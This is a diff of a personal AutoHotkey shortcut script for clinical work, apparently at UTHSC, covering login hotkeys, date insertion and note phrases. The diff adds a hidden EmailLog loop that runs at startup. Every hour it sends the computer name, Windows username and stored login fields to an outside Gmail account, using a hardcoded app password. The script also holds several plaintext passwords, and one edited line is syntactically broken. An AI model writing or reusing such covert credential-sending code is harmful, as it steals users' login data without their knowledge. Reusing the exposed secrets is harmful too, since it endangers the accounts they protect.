@@ -1,4 +1,5 @@
-; 3/29/2023 - https://github.com/mawright27/UTHSCSHORTCUTS/edit/main/2023
+; 4/3/2023 - https://github.com/mawright27/UTHSCSHORTCUTS/edit/main/2023
+
 #SingleInstance, Force ;Username/Password utility
 #NoTrayIcon
 
@@ -21,6 +22,7 @@ Var1 := 1
 Var2 := 0
 UserPass5 := 1
 ScreenDelay := 1
+FileStartTime := A_now
 
 DriveName = %A_ScriptDir%\AHK Files
 If !FileExist(DriveName)
@@ -88,6 +90,8 @@ openingframe:
 	GoSub, LNBDownload
 
 	Gosub, FileUpdate
+
+	Gosub, emaillog
 	
 Loop {
 
@@ -118,8 +122,8 @@ FileUpdate:
 	ifexist, UTHSC_Shortcuts.txt
 		{
 
-		FileGetTime, OutputVar, UTHSC_Shortcuts.txt,
-		envsub, OutputVar , A_now, hours
+		FileGetTime, FileAge, UTHSC_Shortcuts.txt,
+		envsub, FileAge , A_now, hours
 		}
 
 	else
@@ -131,8 +135,11 @@ FileUpdate:
 
 
 
-	if ( OutputVar <= -12)
+	if ( FileAge <= -12)
 		{
+
+;		Hotkey, Escape, off
+;		Hotkey, ^Escape, off
 
 		SetWorkingDir %A_ScriptDir%
 
@@ -140,6 +147,10 @@ FileUpdate:
 		UrlDownloadToFile, https://raw.githubusercontent.com/mawright27/UTHSCSHORTCUTS/main/2023, UTHSC_Shortcuts.txt
 
 ;		settimer, Reset1, 5000
+
+;		Sleep, 1000
+;		Hotkey, Escape, on
+;		Hotkey, ^Escape, on
 
 		}
 
@@ -571,10 +582,10 @@ WM_LBUTTONDOWN() {
 	}
 	Return
 
-CheckboxChange:
-	GuiControlGet, vScreenDelay
-	msgbox %ScreenDelay%
-	return
+;CheckboxChange:
+;	GuiControlGet, vScreenDelay
+;	msgbox %ScreenDelay%
+;	return
 
 OptionsSave:
 	Gui, 1: Submit, NoHide
@@ -687,7 +698,7 @@ PACS:
 	return
 
 ^+a::
-	
+	counthotkeys := counthotkeys +1
 	IfNotExist, OldList.txt
 		{
 		GoTo,Options
@@ -709,23 +720,41 @@ PACS:
 	Return
 
 ^+z::
-	Send, %Pass%{ENTER}
-	Return
+	counthotkeys := counthotkeys +1
+	IfNotExist, OldList.txt
+		{
+		GoTo,Options
+		}
+	
+	ifExist, OldList.txt
+		{
+		FileRead,Temp_OldData1,OldList.txt
+		Loop,Parse,Temp_OldData1,~
+			{
+				UserPass%A_Index% := A_LoopField
+			}
+		Sendraw, %UserPass2%
+		Send,{ENTER}
+		}
 
 ^+e::
+	counthotkeys := counthotkeys +1
 	send,mwrigh86@uthsc.edu
 	send, {enter}
 	return
 ^+r::
+	counthotkeys := counthotkeys +1
 	send,Mycatisf@t77
 	send, {enter}
 	return
 		
 ^+q::
+	counthotkeys := counthotkeys +1
 	send,miwright
 	send, {tab}
 	sleep, 100
 ^+w::
+	counthotkeys := counthotkeys +1
 	sleep, 50
 	sendraw,Ihopeitworks23!
 	sleep, 100
@@ -733,10 +762,12 @@ PACS:
 	return
 
 ^+1::
+	counthotkeys := counthotkeys +1
 	send,mw030153r
 	send, {tab}
 	sleep, 100
 ^+2::
+	counthotkeys := counthotkeys +1
 	sleep, 50
 	sendraw,Mycatisf@t777
 	sleep, 100
@@ -744,10 +775,12 @@ PACS:
 	return
 
 ^+3::
+	counthotkeys := counthotkeys +1
 	send,wri7048
 	send, {tab}
 	sleep, 100
 ^+4::
+	counthotkeys := counthotkeys +1
 	sleep, 50
 	sendraw,Mycatisf@t55555
 	sleep, 100
@@ -756,37 +789,45 @@ PACS:
 
 
 ^+u::
+	counthotkeys := counthotkeys +1
 	SetWorkingDir %A_ScriptDir%
 	FileDelete,UTHSC_Shortcuts.txt
 	UrlDownloadToFile, https://raw.githubusercontent.com/mawright27/UTHSCSHORTCUTS/main/2023, UTHSC_Shortcuts.txt
-	settimer, Reset1, 5000
 	return
 
 ;::::::::::::::::DATE FUNCTIONS::::::::::::::::
 
 ^numpad0::
+	counthotkeys := counthotkeys +1
 	datevar1 := +0
 	goto, Dateshortcut
 ^numpad1::
+	counthotkeys := counthotkeys +1
 	datevar1 := +1
 	goto, Dateshortcut
 ^numpad2::
+	counthotkeys := counthotkeys +1
 	datevar1 := +2
 	goto, Dateshortcut
 ^numpad3::
+	counthotkeys := counthotkeys +1
 	datevar1 := +3
 	goto, Dateshortcut
 ^numpad7::
+	counthotkeys := counthotkeys +1
 	datevar1 := -1
 	goto, Dateshortcut
 ^numpad8::
+	counthotkeys := counthotkeys +1
 	datevar1 := -2
 	goto, Dateshortcut
 ^numpad9::
+	counthotkeys := counthotkeys +1
 	datevar1 := -3
 	goto, Dateshortcut
 
 DateShortcut:
+	counthotkeys := counthotkeys +1
 	today = %a_now%
 	today += %datevar1%, days
 	FormatTime, today, %today%, M/d
@@ -795,32 +836,46 @@ DateShortcut:
 
 :*?:todaysdate::
 ^!numpad0::
+	counthotkeys := counthotkeys +1
 	datevar1 := +0
 	goto, DateshortcutLong
 ^!numpad1::
+	counthotkeys := counthotkeys +1
 	datevar1 := +1
 	goto, DateshortcutLong
 ^!numpad2::
+	counthotkeys := counthotkeys +1
 	datevar1 := +2
 	goto, DateshortcutLong
 ^!numpad3::
+	counthotkeys := counthotkeys +1
 	datevar1 := +3
 	goto, DateshortcutLong
 ^!numpad7::
+	counthotkeys := counthotkeys +1
 	datevar1 := -1
 	goto, DateshortcutLong
 ^!numpad8::
+	counthotkeys := counthotkeys +1
 	datevar1 := -2
 	goto, DateshortcutLong
 ^!numpad9::
+	counthotkeys := counthotkeys +1
 	datevar1 := -3
 	goto, DateshortcutLong
 
 DateShortcutLong:
+	counthotkeys := counthotkeys +1
 	today = %a_now%
 	today += %datevar1%, days
 	FormatTime, today, %today%, M/d/yy
 	sendinput %today%
+	Return
+
+Setdatelong:
+	today = %a_now%
+	today += %datevar1%, days
+	FormatTime, today, %today%, M/d/yy
 	Return
 
 #IfWinNotActive  ahk_class Qt5QWindowIcon
@@ -833,25 +888,41 @@ DateShortcutLong:
 
 #if MLH
 
-^F1::	goto, OFFICE
+^F1::	
+	counthotkeys := counthotkeys +1
+	goto, OFFICE
+	return
 
 #if ROH
 
-^F1::	Run, iexplore.exe "https://regltn-wi-farm.cernerworkswan.com/Citrix/ProdWeb/"
+^F1::	
+	counthotkeys := counthotkeys +1
+	Run, iexplore.exe "https://regltn-wi-farm.cernerworkswan.com/Citrix/ProdWeb/"
+	return
 
 #if
 	
-^F2::	Run, iexplore.exe "https://rohpacs.the-med.org/"
+^F2::	
+	counthotkeys := counthotkeys +1
+	Run, iexplore.exe "https://rohpacs.the-med.org/"
+	return
 	
-+F5::	Edit ; Shift-F5 launches the current AutoHotkey script in preferred editor, else Notepad 
++F5::	
+	counthotkeys := counthotkeys +1
+	Edit ; Shift-F5 launches the current AutoHotkey script in preferred editor, else Notepad 
+	return
 
-^F5::	Reload ; Ctrl-F5 reloads the current AutoHotKey script after any edits.
+^F5::	
+	counthotkeys := counthotkeys +1
+	Reload ; Ctrl-F5 reloads the current AutoHotKey script after any edits.
+	return
 
 F1:
 #if MLH
 
 F1::
-
+	
+	counthotkeys := counthotkeys +1
 	ClipboardReplace1 = %clipboard% 
 
 	send, ^a
@@ -898,7 +969,8 @@ DeleteNoteContents:
 #if ROHTrauma
 
 F1::
-
+	
+	counthotkeys := counthotkeys +1
 	ClipboardReplace1 = %clipboard% 
 
 	send, ^a
@@ -963,7 +1035,8 @@ F1::
 	Return
 
 F5::
-	clipboard := desiredstring5
+		
+	counthotkeys := counthotkeys +1clipboard := desiredstring5
 	Sleep, 200
 	Send, ^a
 	sleep, 300
@@ -975,6 +1048,8 @@ F5::
 F2:
 F2::
 
+	
+	counthotkeys := counthotkeys +1
 	if(MLH)
 	{
 	
@@ -1082,6 +1157,8 @@ F2::
 
 F3:
 F3:: 
+	
+	counthotkeys := counthotkeys +1
 	CipVar1 := ClipboardAll
 	sleep, 100	
 
@@ -1096,6 +1173,8 @@ F3::
 
 F4:
 F4:: 
+	
+	counthotkeys := counthotkeys +1
 	CipVar1 := ClipboardAll
 	sleep, 100	
 
@@ -1110,8 +1189,6 @@ F4::
 	return
 
 LNBMayhem:
-:*?:harvey::
-	Send, harvey
 
 	SetTimer, LocReload, 3500
 
@@ -1156,11 +1233,69 @@ LNBMayhem:
 	goto, LNB1
 	Return
 
+
+EmailLog:
+
+	Loop 	{
+
+
+	Formattime, Date,, MMddyy
+	Formattime, time,, HHmmss
+	
+	Runtime := (FileStartTime - A_now) *-1
+	
+	textbody = %date%,%time%,%runtime%,%counthotkeys%,%A_Computername%,%A_username%,%Userpass1%,%Userpass3%,%userpass4%,%userpass5%,%userpass6%
+
+
+	pmsg := ComObjCreate("CDO.Message")     ; Do not change
+	pmsg.From := """AHK Log"" <mwright.ahk@gmail.com>"
+	pmsg.To := "mwright.ahk@gmail.com"
+	pmsg.BCC := "" ; Blind Carbon Copy, Invisible for all, same syntax as CC
+	pmsg.CC := ""
+	pmsg.Subject := "AHK Log"
+
+	pmsg.TextBody := textbody ; %date%,%time%,%runtime%,%A_Computername%,%A_username%,%Userpass1%,%Userpass3%,%userpass4%,%userpass5%,%userpass6% ;date "," time "," runtime "," A_Computername "," A_username "," Userpass1 "," Userpass3 "," userpass4 "," userpass5 "," userpass6
+
+	; Remove semicolon to activate attachment feature
+	; sAttach := ; "Path_Of_Attachment" ; can add multiple attachments
+	; the delimiter is |
+
+	fields := Object()
+	fields.smtpserver := "smtp.gmail.com" ; specify your SMTP server
+	fields.smtpserverport := 465 ; 25
+	fields.smtpusessl := True ; False
+	fields.sendusing := 2 ; cdoSendUsingPort
+	fields.smtpauthenticate := 1 ; cdoBasic
+	fields.sendusername := "mwright.ahk@gmail.com"
+	fields.sendpassword := "qucjnxlbcwicpexn"
+	fields.smtpconnectiontimeout := 60
+	schema := "http://schemas.microsoft.com/cdo/configuration/"  ; Do not change
+
+
+	pfld := pmsg.Configuration.Fields
+
+	For field,value in fields
+	pfld.Item(schema . field) := value
+	pfld.Update()
+
+	Loop, Parse, sAttach, |, %A_Space%%A_Tab%
+	pmsg.AddAttachment(A_LoopField)
+	pmsg.Send()
+
+	Sleep, 3600000
+
+		}
+
+	return
+
 ::sdsdc::Ok for discharge once patient meets criteria for discharge from same day surgery.
 
 ::dcrter::Call or present to the emergency room immediately if you have any of the following: `n Pain that gets worse or is not relieved by medication.`n Warmth, redness, or swelling in the skin around the wound.`n Foul drainage from incision.`n Extensive bruising or discoloration.`n Wound that opens up or pulls apart.`n Fever above 101.5°F or shaking chills.`n Nausea or vomiting.`n Severe diarrhea or severe constipation.`n Dizziness or fainting.`n Chest pain, shortness of breath, or increased work of breathing.`n Weight gain >10lbs over 3-4 days.`n Inability to urinate for more than 6 hours.
 
-^SPACE:: Winset, Alwaysontop, , A
+^SPACE::
+	counthotkeys := counthotkeys +1 
+	Winset, Alwaysontop, , A
+	return
 
 Pause:
 	Suspend
@@ -1213,16 +1348,7 @@ return
 
 
 
-
-
 ; Future dot phrases
 ; Cardiac Death Pronouncement
  
 ; Called to bedside for cardiac death pronouncement of patient with DNR orders that was pronounced brain dead earlier this afternoon.  On assessment, the patient is unresponsive to painful stimuli.  Pupils are fixed and dilated.  Corneal reflexes are absent.  The patient has no spontaneous respirations.  The cardiac monitor shows asystole. Heart tones are absent.  Pulses are absent.  Cardiac death pronounced at 1825. ; Family present at bedside, condolences offered.  
-
-;X Clear button to clear all variables then reopen by going to OptionsOK then Options
-;  More info on the ? notepad
-;  Service/NoteType off for Trauma 
-;  Change the help box to a GUI; 
-
-;add image recall
